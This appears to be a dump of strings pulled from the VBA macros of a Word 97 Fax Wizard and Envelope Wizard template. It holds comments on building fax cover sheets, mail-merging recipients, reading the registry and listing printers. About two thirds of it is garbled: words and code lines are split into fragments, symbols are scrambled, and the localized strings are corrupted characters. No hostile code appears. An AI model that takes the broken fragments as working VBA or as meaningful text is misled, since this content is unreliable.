            "DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET",
            "OF DIALOG VALUES IN THE REGISTRY.",
            "Fax Wizard",
            "initialises the form",
            "we don't want to add the doc. that was just created thro' FileNew",
            "just one doc. i.e the freshly created one",
            "checks the kind of document and sets fDocIsFormLtr",
            "creates a data source for the cover sheet in the temp. directory",
            "~$CovSht@",
            "dd-mm-yy$ ",
            "hh-mm-ss$ ",
            ".tmp",
            "attach the data source doc. to activedocument (cover sheet)",
            "creates a table in the data source document with names and numbers",
            "the format of the table is just like how one would create a data source doc.",
            "through Word",
            "collect the names and numbers entered by the user",
            "Add a table with 2 columns and iNumRcpnts+1 rows",
            "close the data source doc.",
            " Attempt to locate longname, then shortname template file",
            " Get styles",
            " No Error",
            "creates professional/Contemporary style cover sheet",
            "Insert company name",
            "Insert title",
            "the topics To: and From: have a character style which has to be",
            "applied after the data has been written (since the data have a",
            "different style). so, use a range buffer",
            "1st line text has style \"Message Header First\". The subsequent",
            "lines have \"Message Header\"",
            "Insert To: ",
            "insert recipient name",
            "insert appropriate field",
            "Insert From:",
            "insert sender's name",
            "insert macrobutton field.",
            "set character style for topics",
            "next 3 lines in \"Message Header\" style",
            "Insert Fax Number",
            "insert the appropriate field",
            "Insert Date",
            "insert datefield",
            "set character style for topics",
            "Next line",
            "Insert Phone",
            "Insert Pages:",
            "set character style for topics",
            "Insert Re: ",
            "Insert CC: ",
            "set character style for topics",
            "convert the text into a table",
            "for professional style.",
            "contemporary has autotext entry to insert the lines.",
            "convert to table inserts a vbCr after the table.",
            "Insert title",
            " & vbCr",
            "    objActiveRange.Collapse wdCollapseEnd",
            "creates an elegant style cover sheet",
            "Insert company name",
            "Insert title",
            "the topics To: and From: have a character style which has to be",
            "applied after the data has been written (since the data have a",
            "different style). so, use a range buffer",
            "1st line text has style \"Message Header First\". The subsequent",
            "lines have \"Message Header\"",
            "Insert To: & From: ",
            "Insert textual information in the next line",
            "Preserveformatting",
            "insert name",
            "set character style for topics",
            "next 3 lines in \"Message Header\" style",
            "Insert FaxNumber and Date",
            "Insert textual information in the next line",
            "insert recipient number",
            "Preserveformatting",
            "insert datefield",
            "set character style for topics",
            "Insert CompanyName & Pages ",
            "Insert company name",
            "PreserveFormatting",
            "PreserveFormatting",
            "Phone Number & Re: ",
            "PreserveFormatting",
            "PreserveFormatting",
            "set character style for topics",
            "convert the text into a table",
            "- 1 'don't want the last CR",
            "don't need the bottom border for the last row.",
            "Get the names of the merge fields to be inserted in the cover sheet",
            "If the original doc. is a form letter then we need to insert the merge fields",
            "selected by the user. If not then insert the merge field names we created in the",
            "data source we created",
            "user selects names from drop-down of all possible mergefields in data source",
            "Set objActiveRange = ActiveDocument.Content",
            "If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd",
            "if you have phone number",
            "check if you also have fax",
            "instead of vbCr use space, bullet, space combination",
            "check if you have only Fax ",
            "Inserts the check-boxes and the text associated with them",
            "delete the previous character i.e the last tab",
            "PreserveFormatting",
            "Setting options in Panel1 depending on whether a doc. is present or not",
            "disable a bunch of options",
            "Panel2",
            "read values from registry.",
            "Fax Option",
            "set printer in combo-box before disabling frmFaxDriver.",
            "the controls are assumed to be enabled initially and are explicityly",
            "only turned off, never turned on.",
            "Panel3",
            "Panel5",
            "Sender Fax",
            "Sender Phone",
            "Panel 4",
            "Coversheet Style",
            "reset error trap",
            "sets default merge fields",
            "reset the query options so that all names in the data src are selected",
            "retrieves the Names and numbers stored in registry.",
            "General Date$ ",
            "Fax Option ",
            "U A@",
            "Fax Driver ",
            "Sender Fax ",
            "Sender Phone ",
            "Coversheet Style ",
            "U A@",
            "stores the recipient names and numbers of iMAX_RCPNTS recipients.",
            "The name is tagged to the number. So, you can have a number without a name",
            "but not a name without a number",
            "Dim strName As String",
            "initialize the arrays so that even if the user has not",
            "chosen any recipient we can still use the first entry of the arrays.",
            "recipient number",
            "if number not empty",
            "store number ",
            "and corresponding name",
            "store number",
            "user selected one of the choices",
            "already picked up this text",
            "if we haven't yet iMAX_RCPNTS names",
            "go through the array of orginally obtained recipients and",
            "store which haven't yet been stored",
            "no names left to fill",
            "store name",
            "and corresponding number",
            "Error will be taken care of in SetupDocForFax",
            "Cover sheet is deleted after faxing if no cover sheet is opted by user. So,",
            "Activedocument is new cover sheet doc.",
            "Cover Sheet Present",
            "Cover Sheet Present",
            "store what fax option user chose.",
            "MS Fax Present",
            "Fax Printer",
            "MS Fax Present",
            "Fax Field Name ",
            "if doc. is present and is to be faxed then store relevant info. about doc. ",
            "Main Doc Present",
            "Main Document Name ",
            "is the field a fax number or an Address Book Entry???",
            "Through Email",
            "Main Doc Present",
            "removes vbCR & vbLF from the end of the string",
            "until the last character is not a vbLf or vbCr",
            "check for the last character",
            "counts the number of lines in a string",
            " CountLines",
            "inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng",
            "so pass a collapsed range always.and updates the range to be at the end",
            "of the inserted field.",
            "replaces all occurences of vbCR & vbLF with the delimiter string in strText",
            "returns the new string",
            "remove vbLf thro' search and replace",
            "now replace all occurrences of vbCr with strDelim",
            "removes the character strSrch from strText.",
            "caller should make sure that strSrch is a one character string",
            "returns the string stripped off the character",
            "presence of strChar",
            "strSrch is the last character",
            "append whatever is left of the original string",
            "Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back",
            "this function",
            "dont save recipient info for form letter",
            "fax the doc.",
            "Error will be taken care of in SetupDocForFax",
            "Add a button",
            "Fax.FaxRegDoc",
            "Fax.FaxFormLtr ",
            "Cover sheet is deleted after faxing if no cover sheet is opted by user. So,",
            "Activedocument is new cover sheet doc.",
            "Cover Sheet Present",
            "MS Fax Present$",
            "Main Doc Present$",
            "Fax Field Name$",
            "obtain handle to main document",
            "Main Document Name$",
            "Set objMainDoc = Application.Documents(strDocName)h",
            "if nonMSFax, then set the Fax driver to be the current printer",
            "Fax Printer",
            "fax the cover sheet first",
            "MsgBox \"MailMerging the cover sheet\"",
            "non MS fax",
            "MsgBox \"Faxing to  \" & rgstrFaxNames(0) & rgstrFaxNums(0)",
            "non MS fax",
            "if no main doc. then deesh",
            "send the main doc. ",
            "MsgBox \"Faxing to  \" & rgstrFaxNames(i) & rgstrFaxNums(i)",
            "reset printer for non MS fax",
            "DeleteCmdBar strCMD_BAR_TITLE",
            "if Fax not installed error message",
            "reset printer for non MS fax",
            "Cover sheet is deleted after faxing if no cover sheet is opted by user. So,",
            "Activedocument is new cover sheet doc.",
            "Cover Sheet Present",
            "MS Fax Present$",
            "Main Doc Present$",
            "Fax Field Name$",
            "obtain handle to main document",
            "Main Document Name$",
            "Set objMainDoc = Application.Documents(strDocName)h",
            "Through Email",
            "if nonMSFax, then set the Fax driver to be the current printer",
            "Fax Printer",
            "send the coversheet first",
            "MsgBox \"MailMerging activdoc (coversheet) \"",
            "fax the main document",
            "MsgBox \"MailMerging main doc.\"",
            "reset printer for non MS fax",
            "DeleteCmdBar strCMD_BAR_TITLE",
            "if Fax not installed error message",
            "reset printer for non MS fax",
            "To display help using help files. Assuming that the help files are present in",
            "the windows directory",
            "Get windows directory",
            "Find word's window ",
            "OpusApp",
            "display help",
            "displays a tip during post-wizard options",
            "assumes that Assistant is present since it is called from post-wizard balloon",
            "MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName",
            "ROUTINES TO OBTAIN PRINTERS FROM REGISTRY",
            "fills rgstrPrinterNames with the local and remote printer names obtained",
            "from the registry. iTotalNumPrinters has the number of printer",
            "names obtained.",
            "if no printers, then the user can use cmdOtherPrinters to select one",
            "if we failed to enumerate some printer",
            "\\Servers",
            "no name",
            "\\Servers\\",
            "\\Printers",
            "no name",
            "HKEY_LOCAL_MACHINE\\",
            "Name ",
            "get the list of providers and call GetProviderPrinters for each provider",
            "length of provider name",
            "no name",
            "HKEY_LOCAL_MACHINE\\",
            "Name ",
            "if valid name, add to list",
            "displays post wizard tip in an autodown balloon if Assistant is visible",
            "returns the value stored in registry key strId",
            "returns the string stored in strId. If empty, returns strDefault",
            " If length is 0, it wasn't in regsistry, so use default value",
            " \"~\" is a placeholder to allow returning empty strings",
            " --------------------------------------------------------------------------------------",
            " WORD 97 MINI-WIZARD",
            " Envelope Wizard Specific Code",
            " --------------------------------------------------------------------------------------",
            " --------------------------------------------------------------------------------------",
            " DECLARATIONS",
            " --------------------------------------------------------------------------------------",
            "Public Const strWIZ_NAME = \"H\u02baF\"",
            "Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)",
            "Public Const strBALLOON_HEADING = \"w\u03e5\u03abH\u02baFC\"",
            "Public Const strOPTION_ONE_ACCELERATOR = \"C\"   'This is the form accelerator for strInitialBalloon(0)",
            "Public Const strOPTION_TWO_ACCELERATOR = \"e\"   'This is the form accelerator for strInitialBalloon(1)",
            " NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes",
            " Balloon / Form menu options",
            "\u0625\u07e4@H\u02a4",
            "\u0625\u07f6lHM\u6924\u04a6H\u02a4",
            " Assistant help messages",
            "JH\u02a4WHH\u03a6Ha}C\u03aa\u032cOq Microsoft Outlook sH Microsoft Exchange \u04e4HqT@UuqTvs\u03e5\u03a8\u4924WCzJa}\u042buCLvC",
            "ziH\u03e5\u03a6X\u05a6CL\\\u04eb\u0625\u07ebH\u02a1Cpz\u076dnAbX\u05a6CL\u0724\u076aN|\u07be\u0271z`@TBJ{\u01e1C",
            " InitWizardStrings",
            "On Error GoTo ErrorInitBalloon",
            "Exit",
            " Open the envelope dialog",
            " Start a Mail Merge to envelopes",
            " fnInitialBalloon",
            " End Envelope Wizard Module",
            "Global iPrevChars As Integer",
            "\u043fnrABrn\u04e6rHWC ",
            "\u0178BwI\u03a5\\\u073c\u01b3O@\u04e6rA\u042ds\u072dnrC ",
            "\u0178BwI\u03a5\\\u073c\u01b3O@\u04e6rA\u042ds\u072dnrC ",
            " Remove Additional Spaces",
            " Create DistChar field",
            " {eq \\o\\ad(foo,     )}",
            "@$ ^",
            "eq \\o\\ad(",
            "eq \\o\\ad(",
            " Insert Field",
            " { eq \\o\\ad(foo,     ) }",
            "                      ~ Remove tip space",
            " *************************************",
            " Space DBSpace EmSpace EnSpace 1/4EmSpace",
            "            Create (Len(.Text) + 1)",
            "@$ ^",
            " { eq \\o\\ad(foo,@@@)}",
            "   ~~~~~~~~~        ~~~",
            " eq \\o\\ad(",
            "Attribut",
            "e VB_Nam",
            "e = \"UC0",
            "l0{FCFB3",
            "D2A-A0FA",
            "-1068-A7",
            "38-08002",
            "B3371B5}",
            "|CreatabBl",
            "True",
            "Predecla",
            "Fals",
            "#@Expose",
            "emplateD",
            "eriv",
            "%Cus`tomiz",
            " Const",
            " SZ_MACR ONAME@Cr",
            "Sub Ins",
            "ert()",
            "With Selection\t",
            "If Len(@.Text)#1` And ",
            "Chr$(13)`) The",
            "sgBox \"",
            "nABA",
            "\ufdb5C\",",
            "Tit0le:=\ti",
            "To LExit:",
            "((.Start..",
            "21)R3.Mov",
            "eRight , 1",
            "NJA#",
            "% - 1",
            "FIsRuby",
            "Field(.Range",
            "s.Cou",
            "nt > 0) ",
            "Or (InStLr(",
            "5u, G*<",
            "vbTab) ",
            "/PGP",
            "B!O\u073c\u01a9",
            "[J#URO",
            "  f!",
            "InitDialDog",
            "dlgP.Show",
            "e(sBzA",
            " As ",
            "ng, szFo@P(",
            "iSizeA",
            "Integer,p iDi",
            "szAlign",
            "\tDim r",
            "iCurs",
            "Appli",
            "ca.Scre enUpd",
            "y$@SysteDm.@",
            "sor@",
            "Wait#\t",
            "On Err@",
            "USet",
            "=> |",
            "= Get",
            "ND@t`a",
            "f+= `",
            "MAdi\" ,`Z, ",
            " .Typel \"eq \\opa",
            "*s @",
            "s9 Cq`-(",
            "(\\s\\up\" +8\"$_t(i6+ .1\"B",
            "qhp+ 0X",
            "cBeforeP<",
            "!Cha",
            "racterSpaceGri\u0612",
            " \"),",
            "\t0k)",
            "' Kl@udge, r$em\u0403 s",
            " at eohf fa|.",
            "7 uX<:=",
            "ToggleZCodes",
            "#%`9OOC",
            "0PNormal3",
            " bcLO",
            ".Desc8ripaV",
            "/ubg",
            "ecPNew",
            "BlBoolea",
            "j\t ?\u015fj",
            "rib^15",
            "FYTsR",
            "iTop",
            "v`t <, ",
            "W!Jk",
            "WP@t8tedRy",
            "Fld.Text",
            "veRight ",
            "xDel",
            "PrgnNew.S",
            "d With",
            "@LExit:",
            "f (FUpda",
            "te = True) Then",
            "Applica",
            "tion.Screen",
            ".ing",
            "*System.@Cursor",
            "Normal3",
            "C Sub",
            "IrrorI",
            "MsgBox E",
            "rr.Descr",
            ">, Tit",
            "le:=SZ_M",
            "ACRONAMEL",
            "InitDial",
            "Dim ",
            "i As",
            "teg,er",
            "Font",
            "szCode=",
            "Ruby",
            "OnA7HGoTo L@:",
            "?[Fals\u0101Z",
            "A .IDCD_A",
            "LIGN.Clea@P",
            "AddI@p \"a\"",
            "!\tm\t",
            "Set AT= G",
            "et@AO(.Range",
            "8FieldE",
            "G<_RESET",
            ".Enabled",
            " Values",
            "{ eq \\o\\",
            "ad(\\s\\up",
            " 12(foo),bar) }",
            "_!OwBB",
            "s8(1)R{A#",
            "iTop`,In j(1",
            "`, \"(\"(:!",
            "iMy=`uB",
            ",\") - 2",
            " &)t- ",
            "t@art + ",
            "Ey*R",
            "T_FONT.C",
            ".NameFarEas!",
            "SIZE",
            "E_TEXT@",
            "=<(7a`7+m7+=",
            "B<<<",
            ")DIS",
            ")}(Mid$(WPE\"",
            "-G)RInt(;.3)J1",
            "/BB2",
            "N5O#",
            "> 60O",
            "5aListIndex#0",
            "CE_d#K$(0AxT_=\t$ / 2",
            "IMEM\u044f= f\"m",
            "NoCro",
            ";Focu8s?",
            "Y= '",
            "Lengthy*99\"",
            "!P p<> \"p*+",
            "Func",
            "Boo@",
            "p.Cou@",
            "ASR~F~",
            "~ a\"",
            "),do\" i",
            "s only c",
            "+ainKumimoji f",
            "Left$(@a$, 6)\t\"+",
            "(W6, ",
            "BuildRedir",
            "Arge@L 11HA",
            "8ect@ Case *OHperng",
            "\"WindowsSP",
            "acintosh",
            "http:",
            "//www.mi",
            "crosoft.",
            "com/isap",
            "i/rQ",
            ".dll2? ",
            "PRD=Wordp",
            "&SBP=ia",
            "&PLCI@D=\" & D?",
            "tion.Int",
            "erna",
            "wdProduc",
            "tLanguag",
            "eID)",
            "g$(3) = ",
            "\"&PVER=\"",
            " & Applic",
            "p.Vers",
            "Syst",
            "$LCIRD",
            "y left bPlank",
            ".& \"0x",
            "[Private",
            "fileStri",
            "ng(\"\", \"",
            "HKEY_CUR",
            "RENT_USE",
            "R\\Contro",
            "l Panel\\",
            "Locale\"8",
            "<AR=apl",
            "2s\"I9",
            "HO1=",
            "For i",
            " To 11",
            "  RedirZ^$",
            "ext Buil",
            "End F",
            " Upd/Lin",
            "Dim  Anch$As Re#  ",
            ")Each Hl",
            "  In A",
            "Document@.Hyper",
            " 'look at all h",
            "in doc",
            ".Addr",
            "ess@:\"htt",
            "p://www.",
            "microsof",
            "t.com/is api/r",
            "ll?PRD=W",
            "ord&SBP=ia8.0&Jf Then",
            "to chG7",
            "A#J$T@-#msoG5",
            "getI-",
            " T@a Or ShapDK",
            " 's! ",
            "9.DeleteE",
            "old :",
            "?a9\tD#, R()  ",
            "'@0 new h",
            " `Bsame  ic",
            "`VAWOpX Ex",
            "i\"`'Stand",
            "ard Claimer",
            "'TO ",
            "BE LOCALIZED ",
            "Style n\"s",
            " `st str",
            "STY_RETURN_ADDR\"6",
            " uS\"",
            "hRetu",
            "DOC@_LABEL",
            "Ez Labe",
            "COMPANY_NAME",
            "Company ",
            "MSG_H",
            "DR_FIRST",
            "M@ He",
            "ader Fir|st",
            "@5pmisc2p5P",
            "HON#j",
            "GESm'`",
            "&FROM",
            "DAT ",
            "_NUMBE5",
            "TOTAL0_NO_",
            "t\u02adb`@",
            "EMPAMACR",
            "EmptyMat o'rN3*",
            "<None>\" '\u0400ice  sDli",
            "of Uge fieldka",
            "'M fo",
            "uh1ata s8our\t`O",
            "oc. if t",
            "here is no",
            "r l9-S.\t-",
            "s0Fsncted'p",
            "\tCn@",
            " cov",
            "eet@",
            "YFLD3U",
            "T ' ",
            "c\u042bain",
            "H recipi",
            "xfrom",
            "s p!",
            "D_aK",
            "fax numbz",
            "CLICK_H",
            "EREVf-[",
            "JmW]",
            "SUBJECk",
            "yU\t2PW\u067f",
            "0v;m000\u0477info. +E",
            ". Please",
            " be care",
            "ful aboutb.mas\u0c60K",
            "'spaces ",
            "Nyou might eI",
            "up with ",
            "0begi6n6pPa6Hno",
            "he rb",
            "20>'",
            "9#PonPH",
            "know",
            "r<t WEArA_BK",
            "1_@FORMATK#{",
            "{<PR_GIVDENB",
            " >}|<P",
            "R_DISPLA",
            "Y_NAME>}",
            "Publi",
            "c Const ",
            "strADDR_",
            "FORM",
            "AT As St",
            "ring = \"",
            "{<PR_POS",
            "HESS>",
            "(STREET",
            "(\" & vbC",
            "@LOC",
            "ALITY>}{",
            "2ATE_O",
            "PROVINCE> }",
            "_COD",
            "FAXNUM_",
            "RIMARY_",
            "(BER>|",
            "0BUSIN",
            "0HOME\t",
            "=TEL",
            "OFFI",
            "GCOMxPAN",
            "'status",
            " message",
            "s put up",
            " while f",
            "ax}the c",
            "over she",
            "et and d",
            "ocument. Fo",
            "I add \"...\"B",
            "@kING_DO",
            "C_RECIPI",
            "ENTS",
            "b\u01efuo",
            "D(CS",
            "(\u02ad&'",
            "<Btext in a",
            "lapanel",
            "fir ",
            " is\"",
            "defaulFT@JnA",
            "used i",
            "Jelects noO,`S",
            "we ac",
            "tually s",
            "e@RA",
            " V on ",
            "Fini",
            "shALAST_",
            "eEL_DFLT",
            "A@dJ!",
            "TC\u04a6pAzO",
            "CnOo",
            "NOCO",
            "VSH1",
            "A@U0",
            "eXz?",
            "1C84ec",
            "ry  |dis",
            "play hel",
            "pCcase oBf@ilurB",
            "FDax",
            "3HLPI",
            "Xa2z",
            "{b/O",
            " Windows  95A",
            "NiHw",
            "|X{@U",
            "iDzp\u0726",
            "'AKU",
            "titas ",
            "ippearsAOWord'`a",
            "MS_W",
            "Microsoft A",
            ":+make sA&",
            "thabCMD_",
            "BAR_TITLE!k",
            "TNBZ,  ",
            "do^not\\ g",
            "=combm^barq",
            "e*d?[rK\t {",
            "-CxURR",
            "rRIG",
            "& caxptiE ,",
            "napwi nfollowJM+NTua6t)!WI",
            "NDOW_CAPpTION",
            "#8``",
            ".xjupYcreat0WaU",
            "rCER_SH\u045d",
            "\t@$BTamergi",
            "eldp2nser1",
            "GNum",
            "In NT3.51,2g",
            "p t0",
            "eRdialogch",
            "gq@ ",
            "r , ret",
            "urncp",
            "witBh",
            "loca&arf",
            "\\\\abcpd\\efP\tq",
            "S\tB \"",
            " So vhave]^p op",
            ". TPJ@0RwJth ",
            "nPs for. p",
            "`'unqpHtoo",
            "o{dbe ON?!PRINT)71! ",
            "\"iMdAX",
            " 'max. #ilin",
            "?n 1",
            "Err@5",
            "ERR_",
            "kHa}",
            "iWLT8C\t+Q",
            "_DATA_SR",
            "CREATY",
            "Lk`\u07e1uS1",
            "vuC<C ",
            "MAIN",
            " Xtr",
            "\u04a1C\u0425\t",
            "pOUi",
            "RCP_NO",
            "T_CHOSEN",
            "\u076dn$D\u03eaC\u02acOLa",
            "uvsA",
            "this tip",
            "0displa",
            "yed in a",
            "n Autodo",
            "wn ballo@on fin",
            "Public",
            " Const s",
            "trPOST_W",
            "IZARD_TI",
            "P_NO_MRG",
            "_FLD As ",
            "String =",
            " \"\u043fJ",
            " \" &",
            "]CMD",
            "_BAR",
            "YTLE",
            "\" uy",
            "3u\t$TN_",
            "TEXT",
            "#v0sC ",
            "f wetsert",
            "y mergepel",
            "the c",
            "over sheet i.e.",
            "ase of m",
            "le re",
            "cipients",
            "bu<< >",
            "Q\u03a5L\u0328",
            "!Wme",
            "Wput up aft",
            "V!_succ@",
            "fully fax",
            "bJe\\yngRM",
            "AX_SUC0CESS",
            "Nz#e XhF\"e 72@",
            "ctorr",
            "below 2 ",
            "measurem#pcon!si",
            "{incheo poi",
            "'\ttemporHaryyl",
            "ave a le2fnd",
            "56@CONT",
            "_LEFT_INpDENTB4",
            "=2 A",
            " *,Wh",
            "C%tAtex",
            "t to table, f4",
            "# alone,a",
            "I ne",
            "lumn's w",
            "idth exp",
            "{itly. F",
            "English. !",
            "\"A$bi",
            "g enough. If \t",
            "ru8nca@n ",
            "ur langu@D,",
            "n pl1",
            "ascr",
            "ue.mB",
            "(WIDTH_COL1'2.36'`",
            "A%matc!n",
            "ot be lo caliz#if VB do8a",
            "@requir@",
            "'Medium ",
            "\"02-Apr-",
            "94\"!standardC",
            "sc\\ diff",
            "eraD&countryK!ch $",
            ", sUe mm`",
            "V`minut",
            "`m\u011dlDATE_FORMA",
            "d, y",
            " NOT LOC",
            "ALIZE TH",
            "E <STANT",
            "S/DECLAR",
            "ATIONS B EYOND ",
            ";`w!na@!",
            "a`^ 8ri+",
            "wiz>FDON",
            "'T CHANG",
            "NAMES OF\"",
            "AUTOB\u0580",
            " R`d $@`",
            "<foe",
            "rrespon",
            "l{rAT_ UNCHK`vOX,  B46",
            "UAOck\u04701Box",
            "fCNTMPGFX20",
            "\u0282cntmpg",
            "fx2O",
            "Fax PoMWB",
            "\t.A4WMARG/",
            ".08/",
            "_RIGHT_?",
            "1@G=",
            "LETTER",
            "90&key w",
            "h@ Y",
            "rwri",
            ":company",
            " 1']",
            "trREG",
            "KEY_CMPN,Y_a%",
            "R%_USER\\ Softwp,\\M icros",
            "\\M S Set",
            "(A@CME)\\U ",
            "Info_",
            "rVAL",
            "\u05ddDefC",
            "fDocCKd",
            "\tBoo]n '{1h-u",
            "-*1Zo|c.m`Y",
            "aDsobjMain",
            "uz 'm@",
            "ich ha;/q]sP9f",
            "Da`taSrc",
            "@hce '",
            "pP^a sr",
            "cbSQL qu",
            "d\tsel(ectul",
            "s fromBp",
            "SELECT_QUERYa",
            "cr]ilback",
            "iMPAN",
            "IntegA= 6 '$el #Kla",
            " Fejg (p",
            "rg@G",
            "Assir\tMsgj(",
            "B/Up",
            "BUL3R",
            "SO-ER",
            "\tNo@",
            "'ava<il1\u051c",
            "SKiSTY_PROF0hAL",
            "CPEMPORA@",
            "Y_0\"^Gn",
            "'0arraho>lQ]",
            "or{0lj6",
            "Nl(3,",
            "iLONGE",
            "HORT",
            "iYSt`yi",
            "s2l[s",
            "cho;",
            "8sCo\u0599D",
            "#fMSFAXEn",
            "n0numbermi",
            "4_RCP0",
            "SENDC(",
            "4\"\tMax.~ ",
            "\tQ:_",
            "5\t=N ",
            "qWIs",
            "an 'true",
            " if doc.",
            " is a fo",
            "rm lette",
            "'to s",
            "tore the",
            " data op",
            "tions quHery",
            "ser sele8cts",
            "Public",
            "SQL As",
            " String",
            "#Conn",
            "\"fDocP",
            "resent  ",
            "Boole\t",
            "{n main",
            "apart",
            "'from",
            " create",
            "d by Fil",
            "eNewkee",
            "ps track",
            " of whic",
            "h panel ",
            "be skip0ped.",
            "weD aGenang",
            "<ne0",
            "sh ape's co",
            ",as iHt w",
            "e@. rgiC",
            "F^r(gfS$P((i",
            "MAX_PANE\\L)JO@*\t)AT@,_MT'_n@yQit",
            "G#-#L",
            "ofCheck",
            "Validity",
            "fNoCov",
            "Sht2Fals",
            "\u02af\"No co",
            "vAheet\"",
            "iFaxOD2Integ",
            " programC9 ",
            "st iMS_",
            "  'Micro`soft ",
            "DXIFFC",
            "@qG1out fax s3\\/\"h\"",
            "fRegistr",
            "yNamesRe",
            "adj,eMRU ",
            " h\"Sen `fd hreg`",
            "DimU`\t",
            "Title(3)",
            "ChkB",
            "oxText(5'",
            "@\"D't",
            " bPesid",
            "cD 0boxeeAs",
            "stMsgRcpHntstr",
            " P'ass",
            "ah8elp(",
            "cipis'{5",
            "Ord`\\",
            "orpdina`",
            ". we",
            "@}tip display L",
            "autodown",
            " balloon",
            " af`B7wiz",
            "ardtdone\t",
            "fCCmdBar,",
            "@(g@",
            "only",
            "\u47e1B'ar",
            "rayo geF?r%",
            " and numbers#",
            "B.ryB",
            "\t CLRCPNTS",
            "umsk",
            "t%z >eredH",
            "UiNum",
            "DO N",
            "OT LOCAL",
            "IZE - CO",
            "NTROL NA8MESf>#",
            "SCBtO_",
            "qd3= \"cbob",
            "_NUM\"",
            "Foc|us`",
            "EGISTRY E",
            "UMBER",
            "WIN_HEL@P_FILEG+ ",
            "Win>s.hlp",
            "aw ]d",
            "N\"lCNT",
            "XTQc_INST",
            "AL2w",
            "4618903 ",
            "1698757633,",
            "COMMA",
            "258 'hex@ value",
            "0 x0102/errP",
            "DPC w",
            "T@Y8tur`pP",
            "ot`linst",
            "R!;j-iERR2",
            "5667M",
            "45\\5999- ",
            "RDING PR INTERP;Decl1Funcq",
            "Key ",
            "Lib \"adv",
            "api32.dl@l\" Aliu\"",
            "A\" _",
            "(By hQ",
            "dwInd",
            "lp3P",
            "egOpen",
            ">\tSub$",
            "phkResul",
            "gClose?\t2\t",
            "Get8Di",
            "kerP32&",
            "uSize",
            ".FA3\t",
            "\"USERx",
            "WndClp]",
            "Mb*\\",
            "&\twp",
            "-Dap",
            "Any\"",
            "&Grg",
            "PerQ",
            "iToB[",
            "ZHKEY_",
            "w_MACHIN",
            ")J&H80",
            "T_AC0CESSa",
            "0aFs",
            "PIOR_SbUm",
            "PMORE_ITE`",
            "2G ke",
            "u ?r ",
            "which pr",
            "inter na",
            "mes are ",
            "found",
            "onst str",
            "REG_PROV",
            "IDERS As",
            "g = ",
            "\"System\\Current",
            "trolSet\\",
            "ovi@ders\\\"",
            "OCAL",
            "]INT",
            "itialise",
            " the var",
            "ehc Href",
            "wizard's|",
            "Public@ Sub I",
            "(fDum",
            "|Boolean)",
            "\u01efuFu",
            "Long",
            " Short",
            "ax1!",
            "EndK",
            "ings spe",
            "cif]",
            "lis ",
            "irivate",
            "is(bDim",
            "6Iger",
            "5'fax ti",
            "rBLdifO",
            "yles",
            ",rg@8*T",
            "(i@STY_COsMPORARY)EaDHD",
            "E@LEGANTJ",
            "FESSIONAL",
            "C&'text appea",
            "Auncheck@ed box",
            "2C@hkBoxT",
            "D8As",
            "sistant 1@sag2",
            "\u0167Azi",
            "qll$`",
            "\"Z@_",
            "A  \u03b1qA",
            "LX@@i\u02ad5",
            ")pG@zQnA",
            "A@}g",
            "t\u03acO Wi",
            "ndows NT",
            "AhzL",
            "ka! Micr@osoft ",
            "AOz8\u066cOA#A",
            "w w\u02e6b\t",
            "n\u9a20\u04ecz\"",
            "\\\u0aba\u0721ASY",
            ",!.N",
            "C!a(\u04e1A",
            "iPANEL_RCPNTS<C",
            "|CX z\u032a",
            ".W\u0661C \tCb",
            "N@bz%@\u0427\u1904E",
            "Ja@gb",
            "@)3!LEe",
            "\t\u04adn\u69a1Cb",
            "AH[JB",
            "AX_2\"",
            "]wa]u",
            "W@Bv",
            "'if us' `@ a`rm",
            " let",
            ", we have",
            "et of coBnAs inBR\t@pi@s panel. So",
            " changChe",
            "lp \"Rtoo.",
            "E\\P;t",
            "CRcp",
            "ntsFormL",
            "tr1\\I",
            "umW v2Au",
            "0EH\u03a8F",
            "C@\u04e4`",
            "Owuas",
            "O`rdDoc",
            "?0F@8)",
            ".?1\"0H",
            "WrC0q",
            "aTemplxFile}",
            "l, iLO@NG_NAMs+ M~!",
            ".d<otiU",
            "SHORT",
            "cPr@%",
            "\t{\t{N?\tA\t\u0780",
            "\tCo=\tr",
            "T>\t?\t?\t@r",
            "s1r}Not",
            "DO NOT",
            " IZE BE",
            "YOND THIS POpAo",
            "EParray1thL`color!Nqs",
            "ubway shapf",
            "K = 0 To",
            " iXs",
            "9fSkHipPQQ(iA",
            "False\t",
            "COLOR",
            "_LIGHTGREY",
            "Niu>H@BULLETG",
            "\"\" `",
            "SOFT",
            "Chr0$(11",
            "QUOTE",
            " NEXT ST",
            "RING. WED W TO ",
            "ORE ONLY@",
            " E SETD",
            " DIALOG ",
            "VALUES IRN",
            " E Ip",
            "RegtxKey",
            "S_BASE_",
            "KEY & \"F `",
            "_AsB",
            "mgaq",
            "On Err",
            "Fatal",
            "\tNew",
            "HDlgC",
            " othvTheFn#",
            "Dis [y",
            "pERR_I",
            "NIT_FORM",
            "RepP\u06c2",
            "If!i",
            "B'p\t",
            ".lbl",
            "a1.Caption",
            "&ExlitW",
            "portErro",
            "d Sub",
            " InitW",
            "izard(fD",
            "ummy As ",
            "Boolean)",
            "PForm",
            "lStrings",
            "LfNoCov",
            "Sht = Fa",
            "/fSty",
            "lesCopie",
            "Publi",
            " SetMa inDoc",
            "Di(m c",
            "Integer",
            "<On~GoTo",
            "ItalK",
            "f&IsnL",
            "Pres",
            "Chan",
            "M= Ap",
            "hation.\t",
            "!s.CoHunt=If",
            "f> 1 Then",
            "'we don'",
            "t wa",
            "=to @add th",
            "s ju",
            "st creat",
            "Cthro' FileNew",
            "6 i52 @@'",
            "o*List.AddItem .(i).NamDt",
            "Next i~",
            "Index",
            "]VTru",
            "'8onD>(i.eAf",
            "@ objD@",
            "Noth",
            "xitFa",
            "\u040a\u03c0'checksB#kioflc",
            "sets i\u0296",
            "3lMe",
            "strQuery",
            "C.^LRetur$K",
            "@#t&M",
            "p..(",
            "D%Sr",
            ".Type@",
            "wdNo",
            "Info] r*",
            "etterSQL",
            "Left$(",
            "`, 255",
            "MidQ",
            "Connect-",
            "DN`.Clea wa-5C",
            "!heet",
            " LayF\tMFp",
            "Page9 =up{",
            "StatusBaA@",
            "CREATINGp_DOC",
            "enUpd ng 1#Q",
            "Sys.C",
            "urs= wdqC",
            "Wai c",
